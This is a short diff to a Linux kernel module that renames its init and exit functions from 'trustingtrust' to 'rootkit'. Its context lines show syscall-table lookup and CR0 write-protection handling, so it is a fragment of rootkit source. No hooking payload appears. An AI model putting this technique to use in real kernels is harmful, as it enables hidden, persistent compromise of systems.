@@ -79,7 +79,7 @@ static unsigned long **aquire_sys_call_table(void)
 	return NULL;
 }
 
-static int __init trustingtrust_start(void)
+static int __init rootkit_start(void)
 {
     /* The whole trick here is to find the syscall table in memory
      * so we can copy it to a non-const pointer array,
@@ -105,7 +105,7 @@ static int __init trustingtrust_start(void)
 	return 0;
 }
 
-static void __exit trustingtrust_end(void)
+static void __exit rootkit_end(void)
 {
 	if(!sys_call_table) {
 		return;
@@ -119,7 +119,7 @@ static void __exit trustingtrust_end(void)
     write_cr0(original_cr0);
 }
 
-module_init(trustingtrust_start);
-module_exit(trustingtrust_end);
+module_init(rootkit_start);
+module_exit(rootkit_end);
 
 MODULE_LICENSE("GPL");
